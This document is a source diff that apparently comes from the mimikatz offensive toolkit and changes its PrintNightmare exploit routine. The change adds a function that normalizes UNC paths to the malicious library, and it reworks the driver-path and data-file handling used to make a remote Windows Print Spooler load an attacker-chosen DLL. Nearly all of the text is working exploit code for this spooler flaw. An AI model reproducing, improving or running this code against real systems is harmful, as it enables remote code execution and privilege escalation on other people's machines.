@@ -1405,8 +1405,8 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 {
 	RPC_BINDING_HANDLE hBinding;
 	RPC_STATUS rpcStatus;
-	LPCWSTR szRemote, szService, szLibrary, szShortLibrary;
-	LPWSTR szRand1, szName1, szName2, szSystem32, szDriver, szKernelBase, szDriverPath;
+	LPCWSTR szRemote, szService, szLibrary;
+	LPWSTR szShortLibrary, szRand1, szName1, szName2, szSystem32, szDriver, szKernelBase;
 	DRIVER_INFO_2 DriverInfo = {3, NULL,
 #if defined(_M_X64) || defined(_M_ARM64)
 	L"Windows x64"
@@ -1428,22 +1428,16 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 			{
 				if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
 				{
-					szShortLibrary = wcsrchr(szLibrary, L'\\');
-					if(szShortLibrary && *(szShortLibrary + 1))
+					if(kuhl_m_misc_printnightmare_normalize_library(szLibrary, &DriverInfo.pDataFile, &szShortLibrary))
 					{
-						szShortLibrary++;
-
 						if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_par(hBinding, DriverInfo.pEnvironment, &szSystem32, &szDriver))
 						{
 							if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
 							{
 								kprintf(L"* KernelBase: %s\n", szKernelBase);
-								if(kull_m_string_sprintf(&szDriverPath, L"%sunidrv.dll", szDriver))
+								if(kull_m_string_sprintf(&DriverInfo.pDriverPath, L"%sunidrv.dll", szDriver))
 								{
-									DriverInfo.pDriverPath = szDriverPath;
-									DriverInfo.pDataFile = (LPWSTR) szLibrary;
 									kprintf(L"* DriverPath: %s\n| DataFile  : %s (%s)\n", DriverInfo.pDriverPath, DriverInfo.pDataFile, szShortLibrary);
-
 									szRand1 = kull_m_string_getRandomGUID();
 									if(szRand1)
 									{
@@ -1463,15 +1457,15 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 										}
 										LocalFree(szRand1);
 									}
-									LocalFree(szDriverPath);
+									LocalFree(DriverInfo.pDriverPath);
 								}
 								LocalFree(szKernelBase);
 							}
 							LocalFree(szSystem32);
 							LocalFree(szDriver);
 						}
+						LocalFree(DriverInfo.pDataFile);
 					}
-					else PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", szLibrary);
 				}
 				else if(kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL))
 				{
@@ -1494,22 +1488,16 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 		{
 			if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
 			{
-				szShortLibrary = wcsrchr(szLibrary, L'\\');
-				if(szShortLibrary && *(szShortLibrary + 1))
+				if(kuhl_m_misc_printnightmare_normalize_library(szLibrary, &DriverInfo.pDataFile, &szShortLibrary))
 				{
-					szShortLibrary++;
-
 					if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_rprn(DriverInfo.pEnvironment, &szSystem32, &szDriver))
 					{
 						if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
 						{
 							kprintf(L"* KernelBase: %s\n", szKernelBase);
-							if(kull_m_string_sprintf(&szDriverPath, L"%sunidrv.dll", szDriver))
+							if(kull_m_string_sprintf(&DriverInfo.pDriverPath, L"%sunidrv.dll", szDriver))
 							{
-								DriverInfo.pDriverPath = szDriverPath;
-								DriverInfo.pDataFile = (LPWSTR) szLibrary;
 								kprintf(L"* DriverPath: %s\n| DataFile  : %s (%s)\n", DriverInfo.pDriverPath, DriverInfo.pDataFile, szShortLibrary);
-
 								szRand1 = kull_m_string_getRandomGUID();
 								if(szRand1)
 								{
@@ -1529,13 +1517,14 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 									}
 									LocalFree(szRand1);
 								}
-								LocalFree(szDriverPath);
+								LocalFree(DriverInfo.pDriverPath);
 							}
 							LocalFree(szKernelBase);
 						}
 						LocalFree(szSystem32);
 						LocalFree(szDriver);
 					}
+					LocalFree(DriverInfo.pDataFile);
 				}
 			}
 			else if(kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL))
@@ -1552,6 +1541,39 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	}
 
 	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_misc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
+{
+	BOOL status = FALSE;
+
+	if(szLibrary == wcsstr(szLibrary, L"\\\\"))
+	{
+		status = kull_m_string_sprintf(pszNormalizedLibrary, L"\\??\\UNC%s", szLibrary + 1);
+	}
+	else
+	{
+		status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
+	}
+
+	if(status)
+	{
+		status = FALSE;
+		*pszShortLibrary = wcsrchr(*pszNormalizedLibrary, L'\\');
+		if(*pszShortLibrary && *(*pszShortLibrary + 1))
+		{
+			(*pszShortLibrary)++;
+			status = TRUE;
+		}
+		else
+		{
+			PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", *pszNormalizedLibrary);
+			LocalFree(*pszNormalizedLibrary);
+		}
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_string_sprintf/kull_m_string_copy");
+
+	return status;
 }
 
 void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_par(handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
